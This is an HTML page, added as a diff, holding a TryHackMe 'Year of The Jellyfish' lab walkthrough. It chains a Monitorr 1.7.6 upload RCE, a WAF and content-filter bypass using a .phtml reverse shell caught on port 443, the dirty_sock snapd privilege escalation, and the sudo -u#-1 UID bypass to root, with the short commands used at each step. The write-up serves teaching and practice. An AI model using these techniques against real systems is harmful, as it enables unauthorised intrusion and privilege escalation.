@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Year of The Jellyfish: an n-day web exploit chain to a sudo UID bypass</title>
+  <meta name="description" content="A TryHackMe OSCP-voucher-contest walkthrough: finding a working n-day exploit, defeating a WAF signature and a content-type filter, staging tools via git on a crude shell, a snapd privilege escalation CVE, and a sudo wildcard-UID bypass to root.">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Source+Sans+3:wght@400;500;600;700&display=swap">
+  <link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+<div class="page">
+
+  <div class="eyebrow"><a href="../index.html">&larr; Writeups</a> &middot; TryHackMe</div>
+  <h1>Year of The Jellyfish: an n-day web exploit chain to a sudo UID bypass</h1>
+  <p class="dek">A public exploit that gets flagged as an attack on sight. A content filter that only checks a file's magic bytes. A crude shell with just enough tools to bootstrap better ones. And a sudo rule that blocks root by name, but not by number.</p>
+
+  <div class="meta-row">
+    <span class="pill">Room: Year of The Jellyfish</span>
+    <span class="pill">Category: Web / Linux Privesc</span>
+    <span class="pill">Tools: searchsploit, Linux Exploit Suggester, dirty_sock</span>
+  </div>
+
+  <div class="brief">
+    <p><strong>The setup:</strong> a multi-subdomain host running a known-vulnerable monitoring dashboard. The job: find and adapt a working public exploit, get code execution past two separate upload filters, then escalate through a kernel-adjacent CVE and a subtly broken sudo rule.</p>
+    <p>Flags are omitted below, even the original notes blanked them out before taking the screenshot.</p>
+  </div>
+
+  <section>
+    <h2 class="section-title">The Investigation</h2>
+    <div class="steps">
+
+      <div class="step">
+        <div class="step-num">1</div>
+        <div class="step-body">
+          <div class="step-title">Map the environment from its own TLS certificate</div>
+          <p>The site's TLS certificate lists four Subject Alternative Names on a single cert, essentially handing over the host's internal naming scheme for free. Adding all four to <code>/etc/hosts</code> against the target IP brings every subdomain into scope at once.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>A SAN certificate covering multiple subdomains is reconnaissance the server hands you voluntarily. Checking a cert's alt names costs nothing and regularly reveals hosts a directory brute force would take far longer to find.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">2</div>
+        <div class="step-body">
+          <div class="step-title">Identify the app and find a working n-day</div>
+          <p>One subdomain runs Monitorr, a self-hosted uptime dashboard, and its own settings page prints the exact version in the footer: 1.7.6. Searchsploit turns up two candidates:</p>
+          <pre><code>searchsploit monitorr</code></pre>
+          <p>An authorization-bypass script targets an installer endpoint that's already been removed on this build, a dead end. The second, a remote-code-execution script, targets an upload endpoint that's still very much alive, and reading through its source reveals the upload directory path before a single request is even sent.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>Reading an exploit script's source before running it is worth the extra few minutes. One candidate saved a trip entirely, and the other handed over useful reconnaissance (the real upload path) just from the request it was built to send.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">3</div>
+        <div class="step-body">
+          <div class="step-title">Get past a WAF that recognizes the exploit itself</div>
+          <p>Running the public script as-is fails outright, and the stock output gives no real reason why. Patching the script to print the raw response body is what actually explains it:</p>
+          <pre><code>r = requests.post(url, headers=headers, data=data, verify=True, cookies=cookies)
+print(r.text)</code></pre>
+          <p>The response body reads, almost literally, "You are an exploit." Something upstream is fingerprinting the request itself, most likely the exact header or payload shape the public script is known to send, not the vulnerability it exploits. A self-signed certificate adds a second, unrelated hurdle, solved by disabling TLS verification in the script for this internal target.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>A signature-based filter trained on a specific, widely circulated public exploit script is defeated the moment the request looks even slightly different from that exact script's fingerprint. Printing the actual server response during debugging is what turns "it just doesn't work" into an actionable next step.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">4</div>
+        <div class="step-body">
+          <div class="step-title">Confirm a content filter, not just an extension filter</div>
+          <p>A reverse shell disguised with a <code>.gif</code> extension uploads successfully this time, no WAF complaint. But the listener never catches a connection. Requesting the uploaded file back directly explains why:</p>
+          <pre><code>curl https://&lt;target&gt;/assets/data/usrimg/&lt;uploaded-file&gt;</code></pre>
+          <p>The response is a literal <code>GIF89a...</code> header, the server is serving it, and apparently treating it, as a real image. The upload pipeline is validating file content, not just trusting the extension, and the shell code never gets a chance to run as PHP.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>An extension alone tells a filter nothing about what's actually inside a file. Confirming that the server is both accepting the upload and serving it back as image content, rather than guessing, is what rules out a pure extension-based bypass and points toward needing a different kind of trick.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">5</div>
+        <div class="step-body">
+          <div class="step-title">Find the extension the filter forgot</div>
+          <p>PHP will execute several extensions beyond the obvious <code>.php</code>, and <code>.phtml</code> is one commonly missing from hand-rolled blocklists that only enumerate the usual suspects. Re-uploading under that extension, with a new filename since the server rejects exact duplicates, finally gets a shell that actually executes server-side.</p>
+          <p>One more obstacle: the initial callback port never connects. Switching the reverse shell's target port to 443, a port outbound firewall rules almost always permit, gets a connection back immediately:</p>
+          <pre><code>nc -lvnp 443</code></pre>
+          <p>A shell lands as <code>www-data</code> on a host identifying itself as <code>petshop</code>.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>A filter built around a short, obvious extension list almost always misses the long tail of extensions a web server is actually configured to execute. And outbound firewalls shaping which ports can even leave the network are just as important to account for as any upload filter.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">6</div>
+        <div class="step-body">
+          <div class="step-title">Stage better tools through a tool already on the box</div>
+          <p>The shell this filter chain allows is a crude one, no proper terminal, limited commands. Rather than fight file transfer, <code>git</code> is already installed on the target, so privilege-escalation tooling comes in by cloning it directly from GitHub:</p>
+          <pre><code>git clone https://github.com/mzet-/linux-exploit-suggester.git</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>A low-grade shell doesn't need to block tool transfer entirely, it just rules out some of the usual paths. Whatever's already installed on the target, a package manager, an interpreter, a version control client, is worth checking as a delivery mechanism before assuming nothing will work.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">7</div>
+        <div class="step-body">
+          <div class="step-title">Let a suggester tool narrow down the privesc path</div>
+          <p>Linux Exploit Suggester fingerprints the kernel and distribution, then cross-references both against a database of known escalation paths. Against this box's kernel and Ubuntu version, one match stands out: CVE-2019-7304, nicknamed "dirty_sock", a local privilege escalation through snapd's API.</p>
+          <pre><code>python3 dirty_sockv2.py</code></pre>
+          <p>The exploit abuses snapd's local socket to install, then remove, a trojan snap package, a side effect of which is a brand-new local user with sudo rights.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>A suggester tool doesn't replace manual enumeration, but it does triage dozens of theoretical exploits down to the handful that actually match the box in front of you, kernel version, architecture, and installed packages all narrow the field fast.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">8</div>
+        <div class="step-body">
+          <div class="step-title">Upgrade the shell to actually use the new account</div>
+          <p>The exploit succeeds, but switching to the newly created user requires a real terminal, something the current shell doesn't have. A standard Python PTY upgrade fixes that:</p>
+          <pre><code>python3 -c "import pty; pty.spawn('/bin/bash')"
+export TERM=xterm</code></pre>
+          <p>With an interactive terminal in place, <code>su</code> into the new account succeeds, and <code>sudo -l</code> confirms it can run <code>/bin/bash</code> as any user except root, a <code>(ALL, !root)</code> rule.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>Several common post-exploitation steps, including <code>su</code>, simply refuse to run without a controlling terminal. The PTY upgrade trick isn't optional polish here, it's the one thing standing between a shell and actually using the credentials just obtained.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">9</div>
+        <div class="step-body">
+          <div class="step-title">Defeat "not root" by not naming root at all</div>
+          <p>A sudo rule that blocks a user by the literal string <code>root</code> has a well-known hole: specifying a user by numeric UID instead of by name sidesteps a name-based check entirely. Passing <code>-1</code> as the UID underflows to <code>0</code>, root's real UID:</p>
+          <pre><code>sudo -u#-1 /bin/bash</code></pre>
+          <p>That lands a root shell directly, no exploit left to chain, just one line.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p><code>(ALL, !root)</code> excludes the username <code>root</code>, but sudo still accepts a raw numeric UID for the <code>-u</code> flag. <code>-1</code> isn't a valid signed UID, so it wraps around to UID 0 in the underlying system call, the exact same account the rule was trying to block, just addressed a different way.</p>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <section>
+    <h2 class="section-title">Full Attack Chain</h2>
+    <pre><code>TLS cert SANs &rarr; 4 subdomains mapped
+  &rarr; Monitorr 1.7.6 identified, searchsploit finds a live RCE script
+       &rarr; WAF signature defeated by not replicating the public script's fingerprint
+            &rarr; GIF extension bypass fails: content filter serves it as a real image
+                 &rarr; .phtml extension + port 443 callback: shell as www-data
+                      &rarr; git clone: Linux Exploit Suggester staged on target
+                           &rarr; CVE-2019-7304 (dirty_sock) creates a new sudo user
+                                &rarr; PTY upgrade, su into the new account
+                                     &rarr; sudo -u#-1 /bin/bash: UID wraparound to root</code></pre>
+  </section>
+
+  <section>
+    <h2 class="section-title">Tools Used</h2>
+    <div class="ref-wrap">
+      <table class="ref">
+        <tr><th>Tool</th><th>Purpose</th></tr>
+        <tr><td>searchsploit</td><td>Finding candidate public exploits for the identified app version</td></tr>
+        <tr><td>Modified Python exploit scripts</td><td>Debugging and adapting the upload RCE past a WAF signature</td></tr>
+        <tr><td>git (on-target)</td><td>Staging privilege-escalation tooling without a proper file transfer path</td></tr>
+        <tr><td>Linux Exploit Suggester</td><td>Fingerprinting the kernel and narrowing down a matching privesc CVE</td></tr>
+        <tr><td>dirty_sock (CVE-2019-7304)</td><td>snapd-based local privilege escalation, creates a new sudo-capable user</td></tr>
+      </table>
+    </div>
+  </section>
+
+  <section>
+    <h2 class="section-title">Takeaways</h2>
+    <div class="skills">
+      <div class="skill">
+        <div class="skill-title">Signature-based filters protect against known tools, not known bugs</div>
+        <p>The WAF here wasn't detecting the vulnerability, it was fingerprinting one specific public exploit script. A slightly different request sailed right past it.</p>
+      </div>
+      <div class="skill">
+        <div class="skill-title">Content filters need to be confirmed, not assumed</div>
+        <p>Requesting the uploaded file back and reading what the server actually returned was what revealed a real content check, rather than guessing based on the upload "succeeding."</p>
+      </div>
+      <div class="skill">
+        <div class="skill-title">A sudo exclusion by username is not a security boundary</div>
+        <p><code>!root</code> blocks exactly one string. Any equivalent way to reference the same UID, numeric syntax included, walks straight around it.</p>
+      </div>
+    </div>
+  </section>
+
+  <footer>tryhackme.com &middot; solved via n-day exploitation and privilege escalation chaining</footer>
+</div>
+</body>
+</html>
